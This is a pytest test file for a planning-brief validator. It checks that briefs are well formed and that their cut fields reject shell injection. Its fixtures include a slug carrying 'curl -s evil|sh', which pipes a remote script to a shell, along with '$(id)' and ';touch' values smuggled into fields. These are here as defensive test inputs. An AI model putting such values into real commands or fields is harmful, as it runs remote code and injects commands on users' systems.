"""The plan's brief check: a hard brief's shape, held before its cut is queued.

Each brief written under `tmp_path`. Why: 0083-plan-queues design D1.
"""

import importlib.util
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPT = _REPO / "skills" / "mf-plan" / "scripts" / "brief_check.py"


def _load(path: Path) -> ModuleType:
    spec = importlib.util.spec_from_file_location("brief_check", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


brief_check = _load(_SCRIPT)

_READY = """\
# Plan queues · a minor · hard · 2026-11-06

**The plan queues its cut.**

At f349aa8, 2026-11-06.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a check · **Acceptance:** `make gate` | P11 |

## For the cut
1. **`0083-plan-queues`** · `minor` · after: none · debt: none · decide: recommended
   - models: build opus high · converge opus high · release opus high · cut opus high
   - **Acceptance:** the check halts on a `$(…)` in a command; Verify:
     `grep -n 'x' f` prints a line
"""

_OUT_OF_SHAPE = """\
# Plan queues · a minor · light · 2026-11-05

At --output=x, 2026-11-05.

## Decisions
| # | decision | the reason that settled it |
|---|---|---|
| 1 | a search · Verify: `grep -c $(cat f) x` | P11 |
| 2 | the gate · **Acceptance:** `cd x && make gate` | P11 |

## For the cut

"""


def _write(tmp_path: Path, text: str) -> Path:
    brief = tmp_path / "brief.md"
    brief.write_text(text)
    return brief


def test_a_hard_brief_is_ready_for_the_cut(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    brief = _write(tmp_path, _READY)
    assert brief_check.main([str(brief)]) == 0
    assert capsys.readouterr().out == "brief: ready for the cut\n"
    done = subprocess.run(
        [sys.executable, str(_SCRIPT), str(brief)], capture_output=True, text=True
    )
    assert (done.returncode, done.stdout) == (0, "brief: ready for the cut\n")


def test_a_brief_out_of_shape_halts(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    assert brief_check.main([str(_write(tmp_path, _OUT_OF_SHAPE))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — the title says light: /mf-plan <what> depth=hard from=<brief>",
        "brief: halt — no At <sha>, <YYYY-MM-DD>. line",
        "brief: halt — ## For the cut is empty",
        "brief: halt — ## Decisions: I19 — `$(…)`: `grep -c $(cat f) x`",
        "brief: halt — ## Decisions: I19 — `cd`: `cd x && make gate`",
    ]
    untitled = _READY.replace(" · hard", "")
    assert brief_check.main([str(_write(tmp_path, untitled))]) == 1
    assert capsys.readouterr().out == "brief: halt — the title names no depth\n"
    # The fields the close pastes into `conduct.py cut`, each held to its shape.
    heads = _READY + (
        "2. **x$(curl -s evil|sh)** · major · after: [0082-cut-station, $(id)]\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high;touch\n"
        "3. **ship-fixes** · patch\n"
        "   - models: build opus high\n"
        "4. **ok** · patch · after: none\n"
    )
    assert brief_check.main([str(_write(tmp_path, heads))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: item 2 — not a slug: `x$(curl -s evil|sh)`",
        "brief: halt — ## For the cut: item 2 — not a bump: `major`",
        "brief: halt — ## For the cut: item 2 — not an after id: `$(id)`",
        "brief: halt — ## For the cut: item 2 — not a model or effort: `high;touch`",
        "brief: halt — ## For the cut: item 3 — no after:",
        "brief: halt — ## For the cut: item 3 — the models line is not"
        " build · converge · release · cut, each <model> <effort>",
        "brief: halt — ## For the cut: item 4 — no models line",
    ]
    # An item that opens no number, and a head with a second after:, halt.
    shapes = _READY + (
        "- **x;y** · minor · after: none\n"
        "5. **ok** · minor · after: none · after: a;touch-p\n"
        "   - models: build opus high · converge opus high · release opus high"
        " · cut opus high\n"
    )
    assert brief_check.main([str(_write(tmp_path, shapes))]) == 1
    assert capsys.readouterr().out.splitlines() == [
        "brief: halt — ## For the cut: not a numbered item:"
        " `- **x;y** · minor · after: none`",
        "brief: halt — ## For the cut: item 5 — more than one after:",
    ]


def test_what_cannot_be_checked_exits_2(
    tmp_path: Path,
    capsys: pytest.CaptureFixture[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    missing = tmp_path / "no-brief.md"
    assert brief_check.main([str(missing)]) == 2
    assert capsys.readouterr().out == (
        f"brief: cannot check — {missing}: No such file or directory\n"
    )
    odd = _READY + "   - Verify: `make gate` and a ` stray\n"
    assert brief_check.main([str(_write(tmp_path, odd))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: a backtick opens no span\n"
    )
    unclosed = _READY + "   - Verify: `grep -n 'x f` prints a line\n"
    assert brief_check.main([str(_write(tmp_path, unclosed))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — ## For the cut: No closing quotation: `grep -n 'x f`\n"
    )
    monkeypatch.setattr(brief_check, "CONDUCT", tmp_path / "conduct.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no conduct.py beside this skill\n"
    )
    monkeypatch.setattr(brief_check, "VERIFY_CHECK", tmp_path / "verify_check.py")
    assert brief_check.main([str(_write(tmp_path, _READY))]) == 2
    assert capsys.readouterr().out == (
        "brief: cannot check — no verify_check.py beside this skill\n"
    )
